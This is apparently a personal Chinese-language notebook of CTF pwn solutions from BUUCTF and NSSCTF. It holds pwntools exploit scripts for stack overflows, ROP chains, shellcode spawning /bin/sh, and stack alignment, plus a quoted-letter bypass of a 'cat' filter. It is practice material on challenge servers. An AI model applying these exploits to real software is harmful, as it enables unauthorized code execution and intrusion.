# CTF Pwn 刷题

## buuctf 

### picoctf 2018 buffer_overflow 0
- 知识点：栈溢出
- 代码逻辑：通过观察函数逻辑发现flag.txt文件已经被放入全局变量flag中，因此只需要考虑调用puts函数输出flag即可
```
from pwn import *

p = remote('node5.buuoj.cn', 29495)
elf = ELF('./PicoCTF_2018_buffer_overflow_0')
flag_addr = 0x804A080
puts_addr = elf.symbols['puts']
payload = b'a' * (0x18 + 4) + p32(puts_addr) + p32(0) + p32(flag_addr)
print(payload)

```
### mrctf 2020 easy_overflow
- 
- payload
```
from pwn import *

p = remote('node5.buuoj.cn', 27749)
v5 = "ju3t_@_f@k3_f1@g"
print(len(v5))
fake_flag = "n0t_r3@11y_f1@g"
print(len(fake_flag))
payload = b'a' * 48 + b'n0t_r3@11y_f1@g'
p.sendline(payload)
p.interactive()

```

### picoctf 2018 shellcode

- payload
```
from pwn import *

p = remote('node5.buuoj.cn', 26988)
elf = ELF('./PicoCTF_2018_shellcode')
context(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())
print(shellcode)
p.sendline(shellcode)
p.interactive()
```

### wustctf 2020 getshell 2
- 知识点：栈溢出、ROPgadget使用、shell命令
- 函数流程
- 注意点
1. 这道题获取system函数地址不能用plt地址，因为plt需要返回地址，占用四个字节后会超过栈空间，所以直接使用call _system的地址
2. 二进制程序中不存在/bin/sh字符串，可以用sh字符串平替
```
from pwn import *

p = remote('node5.buuoj.cn', 28992)
sh_addr = 0x08048670
elf = ELF('./wustctf2020_getshell_2')
# system_addr = elf.symbols['system']
system_addr = 0x08048529
# main_addr = elf.got['system']
print(hex(system_addr))
# print(hex(main_addr))
payload = b'a' * (0x18 + 4) + p32(system_addr) + p32(sh_addr)
p.sendline(payload)
p.interactive()

```

### ciscn_2019_es_2
- 知识点：栈迁移
- 栈迁移原理：首先进行栈溢出将ebp修改为目标地址，即需要迁移的地址
- 栈迁移的核心利用要点是找到leave; ret指令


### buu DASBOOK ROP
- 知识点：64位程序栈溢出、参数传递
- payload
```
from pwn import *

p = remote('node4.buuoj.cn', 27902)
elf = ELF('./rop')
bin_sh_addr = 0x601048
system_addr = elf.symbols['system']
print(hex(system_addr))
pop_rdi_addr = 0x400663
payload = b'a' * (0x20 + 8) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
```

### inndy_rop
- 知识点：栈溢出、静态链接、ROPgadget工具使用
- 重要命令：
```
ROPgadget --binary rop --ropchain
```
- payload
```
from struct import pack
from pwn import remote

io = remote('node5.buuoj.cn', 29622)
# Padding goes here
p = b'a' * (0xC + 4)

p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de769) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0806c943) # int 0x80

io.send(p)
io.interactive()

```
### rip
- 知识点： 64位程序栈溢出、栈对齐
- payload
```
from pwn import *

p = remote("node4.buuoj.cn", 25693)
payload = b'a' * 15 + p64(0x401186)
p.sendline(payload)
p.interactive()

```

### bjdctf 2020 babystack
- 知识点：栈溢出
- payload
```
from pwn import *

p = remote('node4.buuoj.cn', 27735)
payload = b'a' * 24 + p64(0x4006E6)
p.sendlineafter(b"name:", "40")
p.sendlineafter(b"name?", payload)
p.interactive()

```








## NSSCTF

### CISCN 2019华北 pwn1

- 知识点：栈溢出、浮点数存储和转化为16进制字节、字节对齐
- 
- payload

```
from pwn import *
import struct

elf = ELF('./CISCN 2019华北PWN1')
p = remote('node4.anna.nssctf.cn', 28336)
# 要发送的小数
float_number = 11.28125

# 将小数转换为字节
byte_data = struct.pack('f', float_number).ljust(8, b'\x00')
print(byte_data)

payload = b'a' * 44 + byte_data
p.sendline(payload)
p.interactive()

```
### GDOUCTF 2023 ezshellcode
- 知识点： shellcode编写、ret2shellcode、栈溢出
- payload
```

```

### NSSCTF 2024秋季赛招新 nocat
- 知识点：linuxcat命令绕过方法：连接符绕过
- payload
```
c'a't flag
```

### NSSCTF 2024秋季招新赛 兄弟你的环境好香
- 知识点：64位程序栈内存对齐
- payload
```
from pwn import *

p = remote('node6.anna.nssctf.cn', 29421)
payload = b'a' * (0x50 + 8) + p64(0x4011F8) + p64(0x4011DD)
p.sendlineafter(b'Do you know stack alignment?', payload)
p.interactive()

```







